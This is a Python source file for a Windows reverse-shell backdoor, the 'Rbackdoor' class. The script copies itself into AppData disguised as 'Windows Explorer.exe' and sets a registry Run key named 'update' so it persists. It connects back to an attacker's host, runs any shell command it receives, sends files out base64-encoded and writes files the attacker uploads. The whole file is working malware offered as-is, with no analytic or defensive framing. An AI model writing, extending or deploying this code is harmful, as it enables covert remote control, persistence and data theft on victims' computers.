#!/usr/bin/python3
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
class Rbackdoor:

    # Creating Constructor method
    
    def __init__(self,ip,port):
        self.windows_tenacious()
        self.sc= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sc.connect((ip,port))

    # Creating a method that enables persistence to the system
    
    def windows_tenacious(self):
        backdoor_loc = os.environ["appdata"]+ "\\Windows Explorer.exe"
        if not os.path.exists(backdoor_loc):
            shutil.copyfile(sys.executable,backdoor_loc)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v  update /t REG_SZ /d "' + backdoor_loc + '"', shell=True)

    # Creating a method for sending data
    
    def send_relaibly(self, data):
        json_data= json.dumps(data.decode('utf-8'))
        self.sc.sendall(json_data.encode('utf-8'))
    
    # Creating a method for recieving data
    
    def rcv_relaibly(self):
        json_data=""
        while True:
            try:
                json_data= json_data + self.sc.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue
    # Creating a method for executing shell command
    
    def exe_command(self,cmd):
        return subprocess.check_output(cmd, shell= True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    # Creating a method for reading files
    
    def read_file(self, filename):
        with open(filename, "rb") as file:
            return base64.b64encode(file.read())

    # Creating method for writing files
    
    def write_file(self, filename, contents):
        with open(filename, "wb") as file:
            file.write(base64.b64decode(contents))
            return (("[+] Successfully uploaded!!!").encode('utf-8'))

    # Creating method for changing directory
    
    def chng_dir(self, loc):
        os.chdir(loc)
        return("[+} Successfully changed to " + loc)

    
    def execute(self):
        while True:
            cmd=self.rcv_relaibly()
            try:
                
                if cmd[0] == "exit":
                    self.sc.close()
                    sys.exit()
                elif cmd[0] == "cd" and len(cmd)>1:
                    cmd_result= self.chng_dir(cmd[1]).encode('utf-8')
                elif cmd[0] == "download":
                    cmd_result = self.read_file(cmd[1])

                elif cmd[0] == "upload":
                    cmd_result = self.write_file(cmd[1],cmd[2])
                elif cmd[0] == "more" and len(cmd)<=1:
                    cmd_result = ("[-] Error during command execution!!!").encode('utf-8')
                    
                    
                else:
                    cmd_result= self.exe_command(cmd)


            except Exception:
                    cmd_result = ("[-] Error during command execution!!!").encode('utf-8')  
            self.send_relaibly(cmd_result)
        



